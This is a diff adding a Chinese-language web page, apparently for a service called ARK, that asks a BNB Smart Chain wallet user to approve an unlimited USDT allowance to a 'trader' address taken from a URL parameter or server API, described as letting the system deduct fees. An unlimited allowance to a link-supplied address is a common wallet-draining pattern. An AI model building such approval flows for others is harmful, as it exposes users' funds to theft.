@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>ARK USDT 授权</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0e17;color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+.c{background:#161b22;border:1px solid #21262d;border-radius:16px;padding:28px 20px;width:100%;max-width:420px;text-align:center}
+.c h2{color:#58a6ff;margin-bottom:8px}
+.sub{color:#8b949e;font-size:.82em;margin-bottom:20px;line-height:1.5}
+.info-box{background:#0d1117;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:16px;text-align:left}
+.info-box .row{display:flex;justify-content:space-between;align-items:center;padding:4px 0;font-size:.82em}
+.info-box .row .k{color:#8b949e}
+.info-box .row .v{color:#d29922;font-family:monospace;font-size:.78em;word-break:break-all;text-align:right;max-width:220px}
+.btn{width:100%;padding:14px;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-top:8px}
+.btn:active{opacity:.85}
+.btn-bg{background:#238636;color:#fff}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.msg{margin-top:12px;padding:12px;border-radius:8px;font-size:.85em;display:none;line-height:1.5;text-align:left}
+.msg.ok{display:block;background:#0d2818;color:#3fb950;border:1px solid #238636}
+.msg.err{display:block;background:#2d1117;color:#f85149;border:1px solid #da3633}
+.msg.info{display:block;background:#0d1117;color:#58a6ff;border:1px solid #1f6feb}
+.txhash-box{margin-top:12px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:10px}
+.txhash-box .label{color:#8b949e;font-size:.75em;margin-bottom:4px}
+.txhash-box .value{font-family:monospace;color:#3fb950;font-size:.82em;word-break:break-all}
+.txhash-box button{margin-top:6px;background:#21262d;border:1px solid #30363d;color:#58a6ff;border-radius:6px;padding:4px 12px;font-size:.75em;cursor:pointer}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="c">
+  <h2>USDT 授权</h2>
+  <div class="sub">点击下方按钮，在钱包中确认授权<br>授权后系统可自动扣除盖茨费</div>
+
+  <div class="info-box">
+    <div class="row"><span class="k">合约</span><span class="v">BSC USDT</span></div>
+    <div class="row"><span class="k">授权地址</span><span class="v" id="traderAddr">--</span></div>
+    <div class="row"><span class="k">授权额度</span><span class="v">无限</span></div>
+    <div class="row"><span class="k">您的钱包</span><span class="v" id="walletAddr">--</span></div>
+    <div class="row"><span class="k">BNB 余额</span><span class="v" id="bnbBal">--</span></div>
+  </div>
+
+  <button class="btn btn-bg" id="approveBtn" onclick="doApprove()">授权 USDT</button>
+
+  <div id="msg" class="msg"></div>
+
+  <div id="txHashArea" style="display:none">
+    <div class="txhash-box">
+      <div class="label">交易哈希 (TxHash) — 请复制此哈希回到授权页面提交</div>
+      <div class="value" id="txHashValue"></div>
+      <button onclick="copyHash()">复制 TxHash</button>
+    </div>
+  </div>
+</div>
+
+<!-- ethers.js v6 from CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
+<script>
+var traderAddress = '';
+var usdtAddress = '0x55d398326f99059fF775485246999027B3197955';
+var currentTxHash = '';
+
+function getParam(name) {
+  var match = new RegExp('[?&]' + name + '=([^&]+)').exec(window.location.search);
+  return match ? decodeURIComponent(match[1]) : '';
+}
+
+function showMsg(text, type) {
+  var m = document.getElementById('msg');
+  m.innerHTML = text;
+  m.className = 'msg ' + type;
+}
+
+function copyHash() {
+  var text = currentTxHash;
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(function() {
+      showMsg('已复制 TxHash', 'ok');
+      setTimeout(function() { document.getElementById('msg').className = 'msg'; }, 2000);
+    });
+  } else {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showMsg('已复制 TxHash', 'ok');
+    setTimeout(function() { document.getElementById('msg').className = 'msg'; }, 2000);
+  }
+}
+
+async function init() {
+  // Get params from URL
+  traderAddress = getParam('trader') || '';
+  var wallet = getParam('wallet') || '';
+
+  if (!traderAddress) {
+    // Try to get from server
+    var token = getParam('token') || '';
+    if (token) {
+      try {
+        var resp = await fetch('/api/vault/approve-params', {
+          headers: { 'Authorization': 'Bearer ' + token }
+        });
+        var data = await resp.json();
+        if (data.success) {
+          traderAddress = data.traderAddress;
+          wallet = data.bscWalletAddr;
+        }
+      } catch(e) {}
+    }
+  }
+
+  document.getElementById('traderAddr').textContent = traderAddress ? traderAddress.slice(0,10) + '...' + traderAddress.slice(-6) : '--';
+  document.getElementById('walletAddr').textContent = wallet ? wallet.slice(0,10) + '...' + wallet.slice(-6) : '--';
+
+  // Check if ethers loaded
+  if (typeof ethers === 'undefined') {
+    showMsg('ethers.js 加载失败，请检查网络连接后刷新页面', 'err');
+    return;
+  }
+
+  // Check provider
+  if (!window.ethereum) {
+    showMsg('未检测到钱包，请确保在 TokenPocket App 内打开此页面', 'err');
+    return;
+  }
+
+  // Get BNB balance
+  try {
+    var provider = new ethers.BrowserProvider(window.ethereum);
+    var signer = await provider.getSigner();
+    var addr = await signer.getAddress();
+    var balance = await provider.getBalance(addr);
+    var bnbStr = ethers.formatEther(balance);
+    document.getElementById('bnbBal').textContent = parseFloat(bnbStr).toFixed(6) + ' BNB';
+    document.getElementById('walletAddr').textContent = addr.slice(0,10) + '...' + addr.slice(-6);
+
+    if (parseFloat(bnbStr) < 0.0001) {
+      showMsg('⚠️ BNB 余额不足！当前: ' + parseFloat(bnbStr).toFixed(6) + ' BNB<br><br>授权需要约 0.00006 BNB 作为 gas 费<br>请确保至少有 0.0001 BNB', 'err');
+      document.getElementById('approveBtn').disabled = true;
+    }
+  } catch(e) {
+    showMsg('连接钱包失败: ' + e.message, 'err');
+  }
+}
+
+async function doApprove() {
+  var btn = document.getElementById('approveBtn');
+  btn.disabled = true;
+
+  if (typeof ethers === 'undefined') {
+    showMsg('ethers.js 未加载，请刷新页面', 'err');
+    btn.disabled = false;
+    return;
+  }
+
+  if (!window.ethereum) {
+    showMsg('未检测到钱包', 'err');
+    btn.disabled = false;
+    return;
+  }
+
+  try {
+    showMsg('<span class="spinner"></span>正在准备交易...', 'info');
+
+    var provider = new ethers.BrowserProvider(window.ethereum);
+    var signer = await provider.getSigner();
+
+    // Verify chain
+    var network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      showMsg('钱包不在 BSC 网络！当前 Chain ID: ' + network.chainId + '<br><br>请在钱包中切换到 BNB Smart Chain 后重试', 'err');
+      btn.disabled = false;
+      return;
+    }
+
+    var addr = await signer.getAddress();
+    showMsg('<span class="spinner"></span>正在发送授权交易...<br>请在钱包弹窗中确认', 'info');
+
+    // Build approve transaction using ethers.js
+    // ethers.js will handle gas estimation, gasPrice, and EIP-155 signing automatically
+    var usdtContract = new ethers.Contract(usdtAddress, [
+      'function approve(address spender, uint256 amount) returns (bool)'
+    ], signer);
+
+    // Max uint256
+    var maxAmount = ethers.MaxUint256;
+
+    // Send transaction — ethers.js handles everything
+    var tx = await usdtContract.approve(traderAddress, maxAmount);
+
+    currentTxHash = tx.hash;
+    showMsg('<span class="spinner"></span>交易已发送，等待链上确认...', 'info');
+
+    // Show tx hash immediately
+    document.getElementById('txHashValue').textContent = tx.hash;
+    document.getElementById('txHashArea').style.display = 'block';
+
+    // Wait for confirmation
+    var receipt = await tx.wait();
+
+    if (receipt.status === 1) {
+      btn.textContent = '✅ 授权成功';
+      showMsg('✅ 授权成功！<br><br>请复制上方的 <b>TxHash</b>，回到 ARK 授权页面粘贴并点击「验证授权」', 'ok');
+    } else {
+      showMsg('❌ 交易执行失败<br><br>TxHash: ' + tx.hash, 'err');
+      btn.disabled = false;
+      btn.textContent = '重新授权';
+    }
+  } catch(e) {
+    var msg = e.message || '未知错误';
+    if (e.code === 'ACTION_REJECTED' || e.code === 4001) {
+      msg = '用户拒绝了交易';
+    } else if (msg.includes('insufficient funds')) {
+      msg = 'BNB 余额不足以支付 gas 费';
+    } else if (msg.includes('execution reverted')) {
+      msg = '合约执行被拒绝';
+    }
+    showMsg('授权失败: ' + msg, 'err');
+    btn.disabled = false;
+    btn.textContent = '重新授权';
+  }
+}
+
+init();
+</script>
+</body>
+</html>
